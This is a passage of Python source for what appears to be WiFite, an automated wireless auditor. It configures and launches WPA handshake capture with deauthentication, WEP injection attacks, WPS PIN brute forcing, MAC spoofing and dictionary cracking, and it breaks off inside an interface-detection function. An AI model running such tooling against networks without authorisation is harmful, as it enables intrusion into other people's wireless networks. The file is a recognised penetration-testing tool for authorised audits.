#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os     # File management
import time   # Measuring attack intervals
import random # Generating a random MAC address.
import errno  # Error numbers
from sys import argv          # Command-line arguments
from sys import stdout, stdin # Flushing
from shutil import copy # Copying .cap files
# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM
import re # RegEx, Converting SSID to filename
import urllib # Check for new versions from the repo

###################
# DATA STRUCTURES #
###################

class CapFile:
	"""
		Holds data about an access point's .cap file, including AP's ESSID & BSSID.
	"""

	def __init__(self, filename, ssid, bssid):
		self.filename = filename
		self.ssid = ssid
		self.bssid = bssid

class Target:
	"""
		Holds data for a Target (aka Access Point aka Router)
	"""

	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data  = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
		self.wps = False # Default to non-WPS-enabled router.
		self.key = ''

class Client:
	"""
		Holds data for a Client (device connected to Access Point/Router)
	"""

	def __init__(self, bssid, station, power):
		self.bssid   = bssid
		self.station = station
		self.power   = power


class WIFITE(object):

	REVISION = 85
	# WPA variables
	WPA_DISABLE          = False # Flag to skip WPA handshake capture
	WPA_STRIP_HANDSHAKE  = True  # Use pyrit or tshark (if applicable) to strip handshake
	WPA_DEAUTH_TIMEOUT   = 10    # Time to wait between deauthentication bursts (in seconds)
	WPA_ATTACK_TIMEOUT   = 500   # Total time to allow for a handshake attack (in seconds)
	WPA_HANDSHAKE_DIR    = 'hs'  # Directory in which handshakes .cap files are stored
	# Strip file path separator if needed
	if WPA_HANDSHAKE_DIR != '' and WPA_HANDSHAKE_DIR[-1] == os.sep:
		WPA_HANDSHAKE_DIR = WPA_HANDSHAKE_DIR[:-1]

	WPA_FINDINGS         = []    # List of strings containing info on successful WPA attacks
	WPA_DONT_CRACK       = False # Flag to skip cracking of handshakes
	WPA_DICTIONARY       = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
	if not os.path.exists(WPA_DICTIONARY): WPA_DICTIONARY = ''

	# Various programs to use when checking for a four-way handshake.
	# True means the program must find a valid handshake in order for wifite to recognize a handshake.
	# Not finding handshake short circuits result (ALL 'True' programs must find handshake)
	WPA_HANDSHAKE_TSHARK   = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)
	WPA_HANDSHAKE_PYRIT    = False # Sometimes crashes on incomplete dumps, but accurate.
	WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
	WPA_HANDSHAKE_COWPATTY = False # Uses more lenient "nonstrict mode" (-2)

	# WEP variables
	WEP_DISABLE         = False # Flag for ignoring WEP networks
	WEP_PPS             = 600   # packets per second (Tx rate)
	WEP_TIMEOUT         = 600   # Amount of time to give each attack
	WEP_ARP_REPLAY      = True  # Various WEP-based attacks via aireplay-ng
	WEP_CHOPCHOP        = True  #
	WEP_FRAGMENT        = True  #
	WEP_CAFFELATTE      = True  #
	WEP_P0841           = True
	WEP_HIRTE           = True
	WEP_CRACK_AT_IVS    = 10000 # Number of IVS at which we start cracking
	WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
	WEP_FINDINGS        = []    # List of strings containing info on successful WEP attacks.
	WEP_SAVE            = False # Save packets.

	# WPS variables
	WPS_DISABLE         = False # Flag to skip WPS scan and attacks
	WPS_FINDINGS        = []    # List of (successful) results of WPS attacks
	WPS_TIMEOUT         = 660   # Time to wait (in seconds) for successful PIN attempt
	WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
	WPS_MAX_RETRIES     = 0     # Number of times to re-try the same pin before giving up completely.

	# Program variables
	WIRELESS_IFACE     = ''    # User-defined interface
	TARGET_CHANNEL     = 0     # User-defined channel to scan on
	TARGET_ESSID       = ''    # User-defined ESSID of specific target to attack
	TARGET_BSSID       = ''    # User-defined BSSID of specific target to attack
	IFACE_TO_TAKE_DOWN = ''    # Interface that wifite puts into monitor mode
	# It's our job to put it out of monitor mode after the attacks
	ORIGINAL_IFACE_MAC = ('', '') # Original interface name[0] and MAC address[1] (before spoofing)
	DO_NOT_CHANGE_MAC  = True  # Flag for disabling MAC anonymizer
	TARGETS_REMAINING  = 0     # Number of access points remaining to attack
	WPA_CAPS_TO_CRACK  = []    # list of .cap files to crack (full of CapFile objects)
	THIS_MAC           = ''    # The interfaces current MAC address.
	SHOW_MAC_IN_SCAN   = False # Display MACs of the SSIDs in the list of targets
	CRACKED_TARGETS    = []    # List of targets we have already cracked
	ATTACK_ALL_TARGETS = False # Flag for when we want to attack *everyone*
	ATTACK_MIN_POWER   = 0     # Minimum power (dB) for access point to be considered a target
	VERBOSE_APS        = True  # Print access points as they appear

	PRINTED_SCANNING   = False

	# Console colors
	W  = '\033[0m'  # white (normal)
	R  = '\033[31m' # red
	G  = '\033[32m' # green
	O  = '\033[33m' # orange
	B  = '\033[34m' # blue
	P  = '\033[35m' # purple
	C  = '\033[36m' # cyan
	GR = '\033[37m' # gray

	def __init__(self):
		if os.getuid() != 0:
			print self.R+' [!]'+self.O+' ERROR:'+self.G+' wifite'+self.O+' must be run as '+self.R+'root'+self.W
			print self.R+' [!]'+self.O+' login as root ('+self.W+'su root'+self.O+') or try '+self.W+'sudo ./wifite.py'+self.W
			exit(1)

		if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]: # OSX support, 'cause why not?
			print self.O+' [!]'+self.R+' WARNING:'+self.G+' wifite'+self.W+' must be run on '+self.O+'linux'+self.W
			exit(1)

		# Create temporary directory to work in
		from tempfile import mkdtemp
		self.temp = mkdtemp(prefix='wifite')
		if not self.temp.endswith(os.sep):
			self.temp += os.sep

		# /dev/null, send output from programs so they don't print to screen.
		self.DN = open(os.devnull, 'w')

	def main(self):
		"""
		Where the magic happens.
		"""

		self.CRACKED_TARGETS = self.load_cracked() # Load previously-cracked APs from file
		self.handle_args() # Parse args from command line, set global variables.
		self.initial_check() # Ensure required programs are installed.

		# The "get_iface" method anonymizes the MAC address (if needed)
		# and puts the interface into monitor mode.
		iface = self.get_iface()

		self.THIS_MAC = self.get_mac_address(iface) # Store current MAC address

		(targets, clients) = self.scan(iface=iface, channel=self.TARGET_CHANNEL)

		try:
			index = 0
			while index < len(targets):
				target = targets[index]
				# Check if we have already cracked this target
				for already in self.CRACKED_TARGETS:
					if already.bssid == targets[index].bssid:
						print self.R+'\n [!]'+self.O+' you have already cracked this access point\'s key!'+self.W
						print self.R+' [!] %s' % (self.C+already.ssid+self.W+': "'+self.G+already.key+self.W+'"')
						ri = raw_input(self.GR+' [+] '+self.W+'do you want to crack this access point again? ('+self.G+'y/'+self.O+'n'+self.W+'): ')
						if ri.lower() == 'n':
							targets.pop(index)
							index -= 1
						break

				# Check if handshakes already exist, ask user whether to skip targets or save new handshakes
				handshake_file = self.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
							 + '_' + target.bssid.replace(':', '-') + '.cap'
				if os.path.exists(handshake_file):
					print self.R+'\n [!] '+self.O+'you already have a handshake file for %s:' % \
						  (self.C+target.ssid+self.W)
					print '        %s\n' % (self.G+handshake_file+self.W)
					print self.GR+' [+]'+self.W+' do you want to '+self.G+'[s]kip'+self.W+', '+self.O+'[c]apture again'+self.W+', or '+self.R+'[o]verwrite'+self.W+'?'
					ri = 'x'
					while ri != 's' and ri != 'c' and ri != 'o':
						ri = raw_input(self.GR+' [+] '+self.W+'enter '+self.G+'s'+self.W+', '+self.O+'c,'+self.W+' or '+self.R+'o'+self.W+': '+self.G).lower()
					print self.W+"\b",
					if ri == 's':
						targets.pop(index)
						index -= 1
					elif ri == 'o':
						self.remove_file(handshake_file)
						continue
				index += 1


		except KeyboardInterrupt:
			print '\n '+self.R+'(^C)'+self.O+' interrupted\n'
			self.exit_gracefully(0)

		wpa_success = 0
		wep_success = 0
		wpa_total   = 0
		wep_total   = 0

		self.TARGETS_REMAINING = len(targets)
		for t in targets:
			self.TARGETS_REMAINING -= 1

			# Build list of clients connected to target
			ts_clients = []
			for c in clients:
				if c.station == t.bssid:
					ts_clients.append(c)

			print ''
			if t.encryption.find('WPA') != -1:
				need_handshake = True
				if not self.WPS_DISABLE and t.wps:
					need_handshake = not self.wps_attack(iface, t)
					wpa_total += 1

				if not need_handshake: wpa_success += 1
				if self.TARGETS_REMAINING < 0: break

				if not self.WPA_DISABLE and need_handshake:
					wpa_total += 1
					if self.wpa_get_handshake(iface, t, ts_clients):
						wpa_success += 1

			elif t.encryption.find('WEP') != -1:
				wep_total += 1
				if self.attack_wep(iface, t, ts_clients):
					wep_success += 1

			else: print self.R+' unknown encryption:',t.encryption,self.W

			# If user wants to stop attacking
			if self.TARGETS_REMAINING <= 0: break

		if wpa_total + wep_total > 0:
			# Attacks are done! Show results to user
			print ''
			print self.GR+' [+] %s%d attack%s completed:%s' % (self.G, wpa_total + wep_total, '' if wpa_total+wep_total == 1 else 's', self.W)
			print ''
			if wpa_total > 0:
				if wpa_success == 0:           print self.GR+' [+]'+self.R,
				elif wpa_success == wpa_total: print self.GR+' [+]'+self.G,
				else:                          print self.GR+' [+]'+self.O,
				print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, self.W)

				for finding in self.WPA_FINDINGS:
					print '        ' + self.C+finding+self.W

			if wep_total > 0:
				if wep_success == 0:           print self.GR+' [+]'+self.R,
				elif wep_success == wep_total: print self.GR+' [+]'+self.G,
				else:                          print self.GR+' [+]'+self.O,
				print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, self.W)

				for finding in self.WEP_FINDINGS:
					print '        ' + self.C+finding+self.W

			caps = len(self.WPA_CAPS_TO_CRACK)
			if caps > 0 and not self.WPA_DONT_CRACK:
				print self.GR+' [+]'+self.W+' starting '+self.G+'WPA cracker'+self.W+' on %s%d handshake%s' % \
					  (self.G, caps, self.W if caps == 1 else 's'+self.W)
				for cap in self.WPA_CAPS_TO_CRACK:
					self.wpa_crack(cap)

		print ''
		self.exit_gracefully(0)

	def rename(self, old, new):
		"""
		Renames file 'old' to 'new', works with separate partitions.
		"""

		try:
			os.rename(old, new)
		except os.error, detail:
			if detail.errno == errno.EXDEV:
				try:
					copy(old, new)
				except:
					os.unlink(new)
					raise
					os.unlink(old)
			# if desired, deal with other errors
			else:
				raise

	def initial_check(self):
		"""
		Ensures required programs are installed.
		"""

		airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
		for air in airs:
			if self.program_exists(air): continue
			print self.R+' [!]'+self.O+' required program not found: %s' % (self.R+air+self.W)
			print self.R+' [!]'+self.O+' this program is bundled with the aircrack-ng suite:'+self.W
			print self.R+' [!]'+self.O+'        '+self.C+'http://www.aircrack-ng.org/'+self.W
			print self.R+' [!]'+self.O+' or: '+self.W+'sudo apt-get install aircrack-ng\n'+self.W
			self.exit_gracefully(1)

		if not self.program_exists('iw'):
			print self.R+' [!]'+self.O+' airmon-ng requires the program %s\n' % (self.R+'iw'+self.W)
			self.exit_gracefully(1)

		printed = False
		# Check reaver
		if not self.program_exists('reaver'):
			printed = True
			print self.R+' [!]'+self.O+' the program '+self.R+'reaver'+self.O+' is required for WPS attacks'+self.W
			print self.R+'    '+self.O+'   available at '+self.C+'http://code.google.com/p/reaver-wps'+self.W
			self.WPS_DISABLE = True
		elif not self.program_exists('walsh') and not self.program_exists('wash'):
			printed = True
			print self.R+' [!]'+self.O+' reaver\'s scanning tool '+self.R+'walsh'+self.O+' (or '+self.R+'wash'+self.O+') was not found'+self.W
			print self.R+' [!]'+self.O+' please re-install reaver or install walsh/wash separately'+self.W

		# Check handshake-checking apps
		recs = ['tshark', 'pyrit', 'cowpatty']
		for rec in recs:
			if self.program_exists(rec): continue
			printed = True
			print self.R+' [!]'+self.O+' the program %s is not required, but is recommended%s' % \
				  (self.R+rec+self.O, self.W)
		if printed: print ''

	def handle_args(self):
		"""
		Handles command-line arguments, sets global variables.
		"""

		# Get all argumets starting from index 1
		# And check if there is no -h or --help keys
		args = argv[1:]
		if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
			self.help()
			self.exit_gracefully(0)

		set_encrypt = False
		set_hscheck = False
		set_wep     = False
		capfile     = ''  # Filename of .cap file to analyze for handshakes

		# This unit is responsible for setting various parameters to be used when scanning.
		# All of them were described above, in first part of script.
		try:
			for i in xrange(0, len(args)):

				if not set_encrypt and (args[i] == '-wpa' or args[i] == '-wep' or args[i] == '-wps'):
					self.WPS_DISABLE = True
					self.WPA_DISABLE = True
					self.WEP_DISABLE = True
					set_encrypt = True
				if args[i] == '-wpa':
					print self.GR+' [+]'+self.W+' targeting '+self.G+'WPA'+self.W+' encrypted networks (use '+self.G+'-wps'+self.W+' for WPS scan)'
					self.WPA_DISABLE = False
				elif args[i] == '-wep':
					print self.GR+' [+]'+self.W+' targeting '+self.G+'WEP'+self.W+' encrypted networks'
					self.WEP_DISABLE = False
				elif args[i] == '-wps':
					print self.GR+' [+]'+self.W+' targeting '+self.G+'WPS-enabled'+self.W+' networks'
					self.WPS_DISABLE = False
				elif args[i] == '-c':
					i += 1
					try: self.TARGET_CHANNEL = int(args[i])
					except ValueError: print self.O+' [!]'+self.R+' invalid channel: '+self.O+args[i]+self.W
					except IndexError: print self.O+' [!]'+self.R+' no channel given!'+self.W
					else: print self.GR+' [+]'+self.W+' channel set to %s' % (self.G+args[i]+self.W)
				elif args[i] == '-mac':
					print self.GR+' [+]'+self.W+' mac address anonymizing '+self.G+'enabled'+self.W
					print self.O+'     note: only works if device is not already in monitor mode!'+self.W
					self.DO_NOT_CHANGE_MAC = False
				elif args[i] == '-i':
					i += 1
					self.WIRELESS_IFACE = args[i]
					print self.GR+' [+]'+self.W+' set interface: %s' % (self.G+args[i]+self.W)
				elif args[i] == '-e':
					i += 1
					try: self.TARGET_ESSID = args[i]
					except ValueError: print self.R+' [!]'+self.O+' no ESSID given!'+self.W
					else: print self.GR+' [+]'+self.W+' targeting ESSID "%s"' % (self.G+args[i]+self.W)
				elif args[i] == '-b':
					i += 1
					try: self.TARGET_BSSID = args[i]
					except ValueError: print self.R+' [!]'+self.O+' no BSSID given!'+self.W
					else: print self.GR+' [+]'+self.W+' targeting BSSID "%s"' % (self.G+args[i]+self.W)
				elif args[i] == '-showb' or args[i] == '-showbssid':
					self.SHOW_MAC_IN_SCAN = True
					print self.GR+' [+]'+self.W+' target MAC address viewing '+self.G+'enabled'+self.W
				elif args[i] == '-all' or args[i] == '-hax0ritna0':
					print self.GR+' [+]'+self.W+' targeting '+self.G+'all access points'+self.W
					self.ATTACK_ALL_TARGETS = True
				elif args[i] == '-pow' or args[i] == '-power':
					i += 1
					try:
						self.ATTACK_MIN_POWER = int(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid power level: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no power level given!'+self.W
					else: print self.GR+' [+]'+self.W+' minimum target power set to %s' % (self.G+args[i] + "dB"+self.W)
				elif args[i] == '-q' or args[i] == '-quiet':
					self.VERBOSE_APS = False
					print self.GR+' [+]'+self.W+' list of APs during scan '+self.O+'disabled'+self.W
				elif args[i] == '-check':
					i += 1
					try: capfile = args[i]
					except IndexError:
						print self.R+' [!]'+self.O+' unable to analyze capture file'+self.W
						print self.R+' [!]'+self.O+' no cap file given!\n'+self.W
						self.exit_gracefully(1)
					else:
						if not os.path.exists(capfile):
							print self.R+' [!]'+self.O+' unable to analyze capture file!'+self.W
							print self.R+' [!]'+self.O+' file not found: '+self.R+capfile+'\n'+self.W
							self.exit_gracefully(1)

				elif args[i] == '-cracked':
					if len(self.CRACKED_TARGETS) == 0:
						print self.R+' [!]'+self.O+' there are not cracked access points saved to '+self.R+'cracked.txt\n'+self.W
						self.exit_gracefully(1)
					print self.GR+' [+]'+self.W+' '+self.W+'previously cracked access points'+self.W+':'
					for victim in self.CRACKED_TARGETS:
						print '     %s (%s) : "%s"' % \
							  (self.C+victim.ssid+self.W, self.C+victim.bssid+self.W, self.G+victim.key+self.W)
					print ''
					self.exit_gracefully(0)

				# WPA
				# Wi-Fi Protected Access (WPA) and Wi-Fi Protected Access II (WPA2) are two security protocols and
				#  security certification programs developed by the Wi-Fi Alliance to secure wireless computer networks.
				if not set_hscheck and (args[i] == '-tshark' or
												args[i] == '-cowpatty' or
												args[i] == '-aircrack' or
												args[i] == 'pyrit'):
					self.WPA_HANDSHAKE_TSHARK   = False
					self.WPA_HANDSHAKE_PYRIT    = False
					self.WPA_HANDSHAKE_COWPATTY = False
					self.WPA_HANDSHAKE_AIRCRACK = False
					set_hscheck = True
				elif args[i] == '-strip':
					self.WPA_STRIP_HANDSHAKE = True
					print self.GR+' [+]'+self.W+' handshake stripping '+self.G+'enabled'+self.W
				elif args[i] == '-wpadt':
					i += 1
					self.WPA_DEAUTH_TIMEOUT = int(args[i])
					print self.GR+' [+]'+self.W+' WPA deauth timeout set to %s' % (self.G+args[i]+' seconds'+self.W)
				elif args[i] == '-wpat':
					i += 1
					self.WPA_ATTACK_TIMEOUT = int(args[i])
					print self.GR+' [+]'+self.W+' WPA attack timeout set to %s' % (self.G+args[i]+' seconds'+self.W)
				elif args[i] == '-crack':
					self.WPA_DONT_CRACK = False
					print self.GR+' [+]'+self.W+' WPA cracking '+self.G+'enabled'+self.W
				elif args[i] == '-dict':
					i += 1
					try:
						self.WPA_DICTIONARY = args[i]
					except IndexError: print self.R+' [!]'+self.O+' no WPA dictionary given!'
					else:
						if os.path.exists(args[i]):
							print self.GR+' [+]'+self.W+' WPA dictionary set to %s' % (self.G+args[i]+self.W)
						else:
							print self.R+' [!]'+self.O+' WPA dictionary file not found: %s' % (args[i])
				if args[i] == '-tshark':
					self.WPA_HANDSHAKE_TSHARK = True
					print self.GR+' [+]'+self.W+' tshark handshake verification '+self.G+'enabled'+self.W
				if args[i] == '-pyrit':
					self.WPA_HANDSHAKE_PYRIT = True
					print self.GR+' [+]'+self.W+' pyrit handshake verification '+self.G+'enabled'+self.W
				if args[i] == '-aircrack':
					self.WPA_HANDSHAKE_AIRCRACK = True
					print self.GR+' [+]'+self.W+' aircrack handshake verification '+self.G+'enabled'+self.W
				if args[i] == '-cowpatty':
					self.WPA_HANDSHAKE_COWPATTY = True
					print self.GR+' [+]'+self.W+' cowpatty handshake verification '+self.G+'enabled'+self.W

				# WEP
				# Wired Equivalent Privacy (WEP) is an easily broken security algorithm for IEEE 802.11 wireless networks.
				if not set_wep and args[i] == '-chopchop' or args[i] == 'fragment' or \
							   args[i] == 'caffelatte' or args[i] == '-arpreplay' or \
							   args[i] == '-p0841' or args[i] == '-hirte':
					self.WEP_CHOPCHOP   = False
					self.WEP_ARPREPLAY  = False
					self.WEP_CAFFELATTE = False
					self.WEP_FRAGMENT   = False
					self.WEP_P0841      = False
					self.WEP_HIRTE      = False
				if args[i] == '-chopchop':
					print self.GR+' [+]'+self.W+' WEP chop-chop attack '+self.G+'enabled'+self.W
					self.WEP_CHOPCHOP = True
				if args[i] == '-fragment' or args[i] == '-frag' or args[i] == '-fragmentation':
					print self.GR+' [+]'+self.W+' WEP fragmentation attack '+self.G+'enabled'+self.W
					self.WEP_FRAGMENT = True
				if args[i] == '-caffelatte':
					print self.GR+' [+]'+self.W+' WEP caffe-latte attack '+self.G+'enabled'+self.W
					self.WEP_CAFFELATTE = True
				if args[i] == '-arpreplay':
					print self.GR+' [+]'+self.W+' WEP arp-replay attack '+self.G+'enabled'+self.W
					self.WEP_ARPREPLAY = True
				if args[i] == '-p0841':
					print self.GR+' [+]'+self.W+' WEP p0841 attack '+self.G+'enabled'+self.W
					self.WEP_P0841 = True
				if args[i] == '-hirte':
					print self.GR+' [+]'+self.W+' WEP hirte attack '+self.G+'enabled'+self.W
					self.WEP_HIRTE = True
				if args[i] == '-nofake':
					print self.GR+' [+]'+self.W+' ignoring failed fake-authentication '+self.R+'disabled'+self.W
					self.WEP_IGNORE_FAKEAUTH = False
				if args[i] == '-wept' or args[i] == '-weptime':
					i += 1
					try:
						self.WEP_TIMEOUT = int(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid timeout: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no timeout given!'+self.W
					else: print self.GR+' [+]'+self.W+' WEP attack timeout set to %s' % \
								(self.G+args[i] + " seconds"+self.W)
				if args[i] == '-pps':
					i += 1
					try:
						self.WEP_PPS = int(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid value: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no value given!'+self.W
					else: print self.GR+' [+]'+self.W+' packets-per-second rate set to %s' % \
								(self.G+args[i] + " packets/sec"+self.W)
				if args[i] == '-save' or args[i] == '-wepsave':
					self.WEP_SAVE = True
					print self.GR+' [+]'+self.W+' WEP .cap file saving '+self.G+'enabled'+self.W

				# WPS
				# Wi-Fi Protected Setup (WPS; originally Wi-Fi Simple Config) is a broken network security standard
				# that attempts to allow users to easily secure a wireless home network, but some networks using this
				# standard could fall to brute-force attacks if one or more of the network's access points do not guard
				# against the attack.
				if args[i] == '-wpst' or args[i] == '-wpstime':
					i += 1
					try:
						self.WPS_TIMEOUT = int(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid timeout: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no timeout given!'+self.W
					else: print self.GR+' [+]'+self.W+' WPS attack timeout set to %s' % \
								(self.G+args[i] + " seconds"+self.W)
				if args[i] == '-wpsratio' or args[i] == 'wpsr':
					i += 1
					try:
						self.WPS_RATIO_THRESHOLD = float(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid percentage: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no ratio given!'+self.W
					else: print self.GR+' [+]'+self.W+' minimum WPS tries/attempts threshold set to %s' % \
								(self.G+args[i] + ""+self.W)
				if args[i] == '-wpsmaxr' or args[i] == '-wpsretry':
					i += 1
					try:
						self.WPS_MAX_RETRIES = int(args[i])
					except ValueError: print self.R+' [!]'+self.O+' invalid number: %s' % (self.R+args[i]+self.W)
					except IndexError: print self.R+' [!]'+self.O+' no number given!'+self.W
					else: print self.GR+' [+]'+self.W+' WPS maximum retries set to %s' % \
								(self.G+args[i] + " retries"+self.W)

		except IndexError:
			print '\nindexerror\n\n'

		if capfile != '':
			self.analyze_capfile(capfile)
		print ''

	def banner(self):
		"""
		Displays ASCII art of the highest caliber.
		"""

		# Just print amazing banner. You can deleted them if you want.
		print ''
		print self.G+"  .;'                     `;,    "
		print self.G+" .;'  ,;'             `;,  `;,   "+self.W+"WiFite v2 (r" + str(self.REVISION) + ")"
		print self.G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
		print self.G+"::   ::   :   "+self.GR+"( )"+self.G+"   :   ::   ::  "+self.GR+"automated wireless auditor"
		print self.G+"':.  ':.  ':. "+self.GR+"/_\\"+self.G+" ,:'  ,:'  ,:'  "
		print self.G+" ':.  ':.    "+self.GR+"/___\\"+self.G+"    ,:'  ,:'   "+self.GR+"designed for Linux"
		print self.G+"  ':.       "+self.GR+"/_____\\"+self.G+"      ,:'     "
		print self.G+"           "+self.GR+"/       \\"+self.G+"             "
		print self.W

	def help(self):
		"""
		Prints help screen
		"""

		head    = self.W
		sw      = self.G
		var     = self.GR
		des     = self.W
		de      = self.G

		print head+'   COMMANDS'+self.W
		print sw+'\t-check '+var+'<file>\t'+des+'check capfile '+var+'<file>'+des+' for handshakes.'+self.W
		print sw+'\t-cracked    \t'+des+'display previously-cracked access points'+self.W
		print ''

		print head+'   GLOBAL'+self.W
		print sw+'\t-all         \t'+des+'attack all targets.              '+de+'[off]'+self.W
		print sw+'\t-i '+var+'<iface>  \t'+des+'wireless interface for capturing '+de+'[auto]'+self.W
		print sw+'\t-mac         \t'+des+'anonymize mac address            '+de+'[off]'+self.W
		print sw+'\t-c '+var+'<channel>\t'+des+'channel to scan for targets      '+de+'[auto]'+self.W
		print sw+'\t-e '+var+'<essid>  \t'+des+'target a specific access point by ssid (name)  '+de+'[ask]'+self.W
		print sw+'\t-b '+var+'<bssid>  \t'+des+'target a specific access point by bssid (mac)  '+de+'[auto]'+self.W
		print sw+'\t-showb       \t'+des+'display target BSSIDs after scan               '+de+'[off]'+self.W
		print sw+'\t-pow '+var+'<db>   \t'+des+'attacks any targets with signal strenghth > '+var+'db '+de+'[0]'+self.W
		print sw+'\t-quiet       \t'+des+'do not print list of APs during scan           '+de+'[off]'+self.W
		print ''

		print head+'\n   WPA'+self.W
		print sw+'\t-wpa        \t'+des+'only target WPA networks (works with -wps -wep)   '+de+'[off]'+self.W
		print sw+'\t-wpat '+var+'<sec>   \t'+des+'time to wait for WPA attack to complete (seconds) '+de+'[500]'+self.W
		print sw+'\t-wpadt '+var+'<sec>  \t'+des+'time to wait between sending deauth packets (sec) '+de+'[10]'+self.W
		print sw+'\t-strip      \t'+des+'strip handshake using tshark or pyrit             '+de+'[off]'+self.W
		print sw+'\t-crack '+var+'<dic>\t'+des+'crack WPA handshakes using '+var+'<dic>'+des+' wordlist file    '+de+'[off]'+self.W
		print sw+'\t-dict '+var+'<file>\t'+des+'specify dictionary to use when cracking WPA '+de+'[phpbb.txt]'+self.W
		print sw+'\t-aircrack   \t'+des+'verify handshake using aircrack '+de+'[on]'+self.W
		print sw+'\t-pyrit      \t'+des+'verify handshake using pyrit    '+de+'[off]'+self.W
		print sw+'\t-tshark     \t'+des+'verify handshake using tshark   '+de+'[on]'+self.W
		print sw+'\t-cowpatty   \t'+des+'verify handshake using cowpatty '+de+'[off]'+self.W

		print head+'\n   WEP'+self.W
		print sw+'\t-wep        \t'+des+'only target WEP networks '+de+'[off]'+self.W
		print sw+'\t-pps '+var+'<num>  \t'+des+'set the number of packets per second to inject '+de+'[600]'+self.W
		print sw+'\t-wept '+var+'<sec> \t'+des+'sec to wait for each attack, 0 implies endless '+de+'[600]'+self.W
		print sw+'\t-chopchop   \t'+des+'use chopchop attack      '+de+'[on]'+self.W
		print sw+'\t-arpreplay  \t'+des+'use arpreplay attack     '+de+'[on]'+self.W
		print sw+'\t-fragment   \t'+des+'use fragmentation attack '+de+'[on]'+self.W
		print sw+'\t-caffelatte \t'+des+'use caffe-latte attack   '+de+'[on]'+self.W
		print sw+'\t-p0841      \t'+des+'use -p0841 attack        '+de+'[on]'+self.W
		print sw+'\t-hirte      \t'+des+'use hirte (cfrag) attack '+de+'[on]'+self.W
		print sw+'\t-nofakeauth \t'+des+'stop attack if fake authentication fails    '+de+'[off]'+self.W
		print sw+'\t-wepca '+self.GR+'<n>  \t'+des+'start cracking when number of ivs surpass n '+de+'[10000]'+self.W
		print sw+'\t-wepsave    \t'+des+'save a copy of .cap files to this directory '+de+'[off]'+self.W

		print head+'\n   WPS'+self.W
		print sw+'\t-wps       \t'+des+'only target WPS networks         '+de+'[off]'+self.W
		print sw+'\t-wpst '+var+'<sec>  \t'+des+'max wait for new retry before giving up (0: never)  '+de+'[660]'+self.W
		print sw+'\t-wpsratio '+var+'<per>\t'+des+'min ratio of successful PIN attempts/total tries    '+de+'[0]'+self.W
		print sw+'\t-wpsretry '+var+'<num>\t'+des+'max number of retries for same PIN before giving up '+de+'[0]'+self.W

		print head+'\n   EXAMPLE'+self.W
		print sw+'\tmain.py WIFI '+self.W+'-wps -wep -c 6 -pps 600'+self.W
		print ''


	###########################
	# WIRELESS CARD FUNCTIONS #
	###########################

	def enable_monitor_mode(self, iface):
		"""
		Uses airmon-ng to put a device into Monitor Mode.
		Then uses the get_iface() method to retrieve the new interface's name.
		Sets global variable IFACE_TO_TAKE_DOWN as well.
		Returns the name of the interface in monitor mode.
		"""

		print self.GR+' [+]'+self.W+' enabling monitor mode on %s...' % (self.G+iface+self.W),
		stdout.flush()
		call(['airmon-ng', 'start', iface], stdout=self.DN, stderr=self.DN)
		print 'done'
		self.IFACE_TO_TAKE_DOWN = self.get_iface()

	def disable_monitor_mode(self):
		"""
		The program may have enabled monitor mode on a wireless interface.
		We want to disable this before we exit, so we will do that.
		"""

		if self.IFACE_TO_TAKE_DOWN == '': return
		print self.GR+' [+]'+self.W+' disabling monitor mode on %s...' % (self.G+self.IFACE_TO_TAKE_DOWN+self.W),
		stdout.flush()
		call(['airmon-ng', 'stop', self.IFACE_TO_TAKE_DOWN], stdout=self.DN, stderr=self.DN)
		print 'done'

	def get_iface(self):
		"""
		Get the wireless interface in monitor mode.
		Defaults to only device in monitor mode if found.
		Otherwise, enumerates list of possible wifi devices
		and asks user to select one to put into monitor mode (if multiple).
		Uses airmon-ng to put device in monitor mode if needed.
		Returns the name (string) of the interface chosen in monitor mode.
		"""

		if not self.PRINTED_SCANNING:
			print self.GR+' [+]'+self.W+' scanning for wireless devices...'
			self.PRINTED_SCANNING = True

		proc  = Popen(['iwconfig'], stdout=PIPE, stderr=self.DN)
		iface = ''
		monitors = []
		for line in proc.communicate()[0].split('\n'):
			if len(line) == 0: continue
			if ord(line[0]) != 32: # Doesn't start with space
				iface = line[:line.find(' ')] # is the interface
			if line.find('Mode:Monitor') != -1:
				monitors.append(iface)

		if self.WIRELESS_IFACE != '':
			if monitors.count(self.WIRELESS_IFACE): self.WIRELESS_IFACE=self.WIRELESS_IFACE
			print self.R+' [!]'+self.O+' could not find wireless interface %s' % \
				  ('"'+self.R+self.WIRELESS_IFACE+self.O+'"'+self.W)

		if len(monitors) == 1:
			return monitors[0] # Default to only device in monitor mode
		elif len(monitors) > 1:
			print self.GR+" [+]"+self.W+" interfaces in "+self.G+"monitor mode:"+self.W
			for i, monitor in enumerate(monitors):
